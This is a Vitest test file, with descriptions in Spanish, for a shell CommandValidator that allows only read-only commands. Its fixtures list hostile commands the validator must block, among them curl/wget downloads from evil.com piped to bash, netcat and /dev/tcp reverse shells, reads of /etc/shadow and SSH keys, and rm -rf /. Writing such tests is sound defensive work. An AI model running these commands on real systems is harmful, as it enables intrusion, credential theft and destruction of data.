import { describe, it, expect, beforeEach } from 'vitest';
import {
  CommandValidator,
  DangerousCharactersError,
  CommandNotAllowedError,
  InvalidCommandFormatError
} from '../../src/security/commandValidator';

describe('CommandValidator', () => {
  let validator: CommandValidator;

  beforeEach(() => {
    validator = new CommandValidator();
  });

  describe('Validaciones básicas', () => {
    it('debe aceptar comando ls simple', () => {
      const result = validator.validate('ls');
      expect(result.isOk()).toBe(true);
      expect(result.unwrap()).toBe('ls');
    });

    it('debe aceptar ls con flags', () => {
      const result = validator.validate('ls -la');
      expect(result.isOk()).toBe(true);
    });

    it('debe rechazar comando null', () => {
      const result = validator.validate(null as any);
      expect(result.isErr()).toBe(true);
      expect((result as any).error.code).toBe('NULL_COMMAND');
    });

    it('debe rechazar comando undefined', () => {
      const result = validator.validate(undefined as any);
      expect(result.isErr()).toBe(true);
    });

    it('debe rechazar string vacío', () => {
      const result = validator.validate('');
      expect(result.isErr()).toBe(true);
      expect((result as any).error.code).toBe('EMPTY_COMMAND');
    });

    it('debe rechazar solo espacios', () => {
      const result = validator.validate('   ');
      expect(result.isErr()).toBe(true);
    });
  });

  describe('Protección contra caracteres peligrosos', () => {
    const dangerousCommands = [
      { cmd: 'ls; rm -rf /', char: ';', name: 'semicolon' },
      { cmd: 'ls && cat /etc/passwd', char: '&', name: 'ampersand' },
      { cmd: 'ls | cat', char: '|', name: 'pipe' },
      { cmd: 'ls `whoami`', char: '`', name: 'backtick' },
      { cmd: 'ls $(whoami)', char: '$', name: 'dollar' },
      { cmd: 'ls $(cat /etc/passwd)', char: '(', name: 'parenthesis' },
      { cmd: 'ls ${HOME}', char: '{', name: 'brace' },
      { cmd: 'ls [1]', char: '[', name: 'bracket' },
      { cmd: 'ls \\', char: '\\', name: 'backslash' },
      { cmd: 'ls < /etc/passwd', char: '<', name: 'less than' },
      { cmd: 'ls > /tmp/output', char: '>', name: 'greater than' },
      { cmd: 'ls !', char: '!', name: 'exclamation' },
    ];

    dangerousCommands.forEach(({ cmd, char, name }) => {
      it(`debe bloquear ${name}: "${cmd}"`, () => {
        const result = validator.validate(cmd);
        expect(result.isErr()).toBe(true);
        expect((result as any).error).toBeInstanceOf(DangerousCharactersError);
        expect((result as any).error.code).toBe('DANGEROUS_CHARS');
      });
    });
  });

  describe('Command Injection avanzado', () => {
    const injectionAttempts = [
      { cmd: 'ls;cat /etc/passwd', name: 'sin espacios' },
      { cmd: 'ls&&cat /etc/passwd', name: 'doble ampersand sin espacios' },
      { cmd: 'ls||cat /etc/passwd', name: 'doble pipe' },
      { cmd: 'ls; curl https://evil.com | bash', name: 'download and execute' },
      { cmd: 'ls; wget -O - https://evil.com | sh', name: 'wget pipe' },
      { cmd: 'eval $(ls)', name: 'eval' },
      { cmd: 'ls; exec /bin/sh', name: 'exec' },
      { cmd: 'ls; system("id")', name: 'system call' },
      { cmd: 'ls; popen("id")', name: 'popen' },
    ];

    injectionAttempts.forEach(({ cmd, name }) => {
      it(`debe bloquear: ${name}`, () => {
        const result = validator.validate(cmd);
        expect(result.isErr()).toBe(true);
      });
    });
  });

  describe('Comandos permitidos - ls', () => {
    it('debe aceptar ls', () => {
      expect(validator.validate('ls').isOk()).toBe(true);
    });

    it('debe aceptar ls -la', () => {
      expect(validator.validate('ls -la').isOk()).toBe(true);
    });

    it('debe aceptar ls -lah', () => {
      expect(validator.validate('ls -lah').isOk()).toBe(true);
    });

    it('debe rechazar ls con path traversal', () => {
      const result = validator.validate('ls ../../../etc');
      expect(result.isErr()).toBe(true);
    });
  });

  describe('Comandos permitidos - cat', () => {
    it('debe aceptar cat archivo.ts', () => {
      expect(validator.validate('cat src/test.ts').isOk()).toBe(true);
    });

    it('debe aceptar cat con path relativo', () => {
      expect(validator.validate('cat ./package.json').isOk()).toBe(true);
    });

    it('debe bloquear cat de archivos sensibles', () => {
      const sensitiveFiles = [
        'cat /etc/passwd',
        'cat /etc/shadow',
        'cat .env',
        'cat .env.local',
        'cat id_rsa',
        'cat ~/.ssh/id_rsa',
        'cat /root/.ssh/authorized_keys',
      ];

      sensitiveFiles.forEach(cmd => {
        const result = validator.validate(cmd);
        expect(result.isErr()).toBe(true);
        expect((result as any).error.code).toBe('SENSITIVE_FILE');
      });
    });
  });

  describe('Comandos permitidos - pm2', () => {
    it('debe aceptar pm2 list', () => {
      expect(validator.validate('pm2 list').isOk()).toBe(true);
    });

    it('debe aceptar pm2 status', () => {
      expect(validator.validate('pm2 status').isOk()).toBe(true);
    });

    it('debe aceptar pm2 logs', () => {
      expect(validator.validate('pm2 logs').isOk()).toBe(true);
    });

    it('debe aceptar pm2 monit', () => {
      expect(validator.validate('pm2 monit').isOk()).toBe(true);
    });

    it('debe aceptar pm2 info', () => {
      expect(validator.validate('pm2 info').isOk()).toBe(true);
    });

    it('debe BLOQUEAR pm2 restart', () => {
      const result = validator.validate('pm2 restart app');
      expect(result.isErr()).toBe(true);
    });

    it('debe BLOQUEAR pm2 stop', () => {
      const result = validator.validate('pm2 stop app');
      expect(result.isErr()).toBe(true);
    });

    it('debe BLOQUEAR pm2 delete', () => {
      const result = validator.validate('pm2 delete app');
      expect(result.isErr()).toBe(true);
    });
  });

  describe('Comandos permitidos - git', () => {
    it('debe aceptar git status', () => {
      expect(validator.validate('git status').isOk()).toBe(true);
    });

    it('debe aceptar git log', () => {
      expect(validator.validate('git log').isOk()).toBe(true);
    });

    it('debe aceptar git diff', () => {
      expect(validator.validate('git diff').isOk()).toBe(true);
    });

    it('debe aceptar git branch', () => {
      expect(validator.validate('git branch').isOk()).toBe(true);
    });

    it('debe aceptar git remote', () => {
      expect(validator.validate('git remote').isOk()).toBe(true);
    });

    it('debe aceptar git show', () => {
      expect(validator.validate('git show').isOk()).toBe(true);
    });

    it('debe BLOQUEAR git push', () => {
      const result = validator.validate('git push origin main');
      expect(result.isErr()).toBe(true);
    });

    it('debe BLOQUEAR git pull', () => {
      const result = validator.validate('git pull');
      expect(result.isErr()).toBe(true);
    });

    it('debe BLOQUEAR git checkout', () => {
      const result = validator.validate('git checkout -b feature');
      expect(result.isErr()).toBe(true);
    });
  });

  describe('Comandos permitidos - curl', () => {
    it('debe aceptar curl simple con max-time', () => {
      expect(validator.validate('curl --max-time 5 https://api.example.com').isOk()).toBe(true);
    });

    it('debe BLOQUEAR curl con output', () => {
      const result = validator.validate('curl -o /tmp/malware.sh https://evil.com');
      expect(result.isErr()).toBe(true);
    });

    it('debe BLOQUEAR curl con redirect', () => {
      const result = validator.validate('curl https://evil.com > /tmp/file');
      expect(result.isErr()).toBe(true);
    });

    it('debe BLOQUEAR curl sin max-time', () => {
      const result = validator.validate('curl https://example.com');
      expect(result.isErr()).toBe(true);
    });

    it('debe BLOQUEAR curl con pipe', () => {
      const result = validator.validate('curl https://evil.com | bash');
      expect(result.isErr()).toBe(true);
    });
  });

  describe('Comandos NO permitidos', () => {
    const forbiddenCommands = [
      'rm -rf /',
      'rm -rf .',
      'chmod 777 /',
      'chown root:root /',
      'sudo ls',
      'su -',
      'passwd',
      'useradd hacker',
      'mkfs.ext4 /dev/sda1',
      'dd if=/dev/zero of=/dev/sda',
      'reboot',
      'shutdown -h now',
      'systemctl stop firewalld',
      'iptables -F',
      'nc -e /bin/sh 10.0.0.1 1234',
      'bash -i >& /dev/tcp/10.0.0.1/1234 0>&1',
      'python -c "import os; os.system(\'id\')"',
      'perl -e "system(\'id\')"',
      'ruby -e "system(\'id\')"',
      'node -e "require(\'child_process\').exec(\'id\')"',
    ];

    forbiddenCommands.forEach(cmd => {
      it(`debe bloquear: ${cmd}`, () => {
        const result = validator.validate(cmd);
        expect(result.isErr()).toBe(true);
        expect((result as any).error).toBeInstanceOf(CommandNotAllowedError);
      });
    });
  });

  describe('Reglas personalizadas', () => {
    it('debe permitir comandos personalizados', () => {
      const customValidator = new CommandValidator([
        {
          name: 'custom',
          pattern: /^custom\s+\w+$/,
          description: 'Comando personalizado'
        }
      ]);

      const result = customValidator.validate('custom test');
      expect(result.isOk()).toBe(true);
    });
  });

  describe('validateAndRun', () => {
    it('debe ejecutar comando válido', async () => {
      const mockExecutor = async (cmd: string) => `Executed: ${cmd}`;

      const result = await validator.validateAndRun('pwd', mockExecutor);
      expect(result.isOk()).toBe(true);
      expect(result.unwrap()).toBe('Executed: pwd');
    });

    it('debe rechazar comando inválido sin ejecutar', async () => {
      const mockExecutor = async () => 'Should not run';

      const result = await validator.validateAndRun('rm -rf /', mockExecutor);
      expect(result.isErr()).toBe(true);
    });
  });

  describe('getAllowedCommands', () => {
    it('debe listar todos los comandos permitidos', () => {
      const commands = validator.getAllowedCommands();

      expect(commands).toContainEqual(expect.objectContaining({
        name: 'ls',
        description: expect.any(String),
        pattern: expect.any(String)
      }));

      expect(commands.length).toBeGreaterThan(0);
    });
  });

  describe('Edge cases', () => {
    it('debe manejar comando con tabs', () => {
      const result = validator.validate('ls\t-la');
      expect(result.isOk()).toBe(true);
    });

    it('debe manejar comando con múltiples espacios', () => {
      const result = validator.validate('ls   -la');
      expect(result.isOk()).toBe(true);
    });

    it('debe ser case-sensitive en comando base', () => {
      const result = validator.validate('LS');
      expect(result.isErr()).toBe(true);
    });
  });
});
